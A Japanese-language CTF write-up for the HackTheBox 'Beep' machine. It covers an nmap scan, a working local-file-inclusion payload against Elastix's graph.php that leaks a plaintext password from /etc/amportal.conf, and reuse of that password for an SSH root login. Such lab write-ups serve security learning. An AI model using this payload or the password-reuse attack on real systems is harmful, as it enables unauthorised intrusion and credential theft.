+++
title = "HackTheBox - Beep Writeup"
date = "2026-04-09"
description = "ElastixのLFIで認証情報を取得し、SSHパスワード再利用でroot直取り"
tags = ["HackTheBox", "CTF", "Linux", "LFI", "SSH", "Elastix", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Beep |
| OS | Linux (CentOS) |
| Difficulty | Easy |
| IP | 10.129.229.183 |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.229.183
```

```text
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1
```

443番ポートで **Elastix**（FreePBXベースのIP-PBXシステム）、10000番ポートで **Webmin** が動作していることを確認。

---

## Initial Access — Elastix LFI

Elastix 2.2.0 には `graph.php` を経由したローカルファイルインクルージョン（LFI）の既知脆弱性が存在する。

```text
https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

`/etc/amportal.conf` の読み出しに成功し、以下の認証情報を取得。

```text
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

---

## Payload Generation

本マシンはパスワード再利用による SSH 直接ログインのため、ペイロード生成は不要。

---

## Upload / Delivery

該当なし。

---

## Trigger

該当なし。

---

## Listener

該当なし。

---

## Foothold — SSH Login as root

取得したパスワードを SSH の root アカウントに対して試行。
マシンが古く、現代の SSH クライアントでは使用できない暗号方式を明示的に指定する必要がある。

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oCiphers=+aes256-cbc \
    root@10.129.229.183
```

```text
root@10.129.229.183's password: jEhdIekWmdjE

Welcome to Elastix
[root@beep ~]#
```


---

## System Info

```bash
uname -a
```

```text
Linux beep 2.6.18-238.12.1.el5 #1 SMP Tue May 31 13:23:01 EDT 2011 i686 athlon i386 GNU/Linux

```

---


---

## Results

- LFI により `/etc/amportal.conf` から平文パスワードを取得
- パスワードが root アカウントに再利用されていた
- SSH で root 直接ログイン成功（権限昇格ステップなし）

---

## Privilege Escalation

初期アクセス時点で root のため、権限昇格は不要。

---

## Root Shell

```bash
whoami
```

```text
root
```

---

## Flags

### User

```bash
cat /home/fanis/user.txt
```


### Root

```bash
cat /root/root.txt
```


---

## Summary

ElastixのLFIで`/etc/amportal.conf`から認証情報を取得 → パスワード再利用でSSH root直接ログイン → フラグ取得
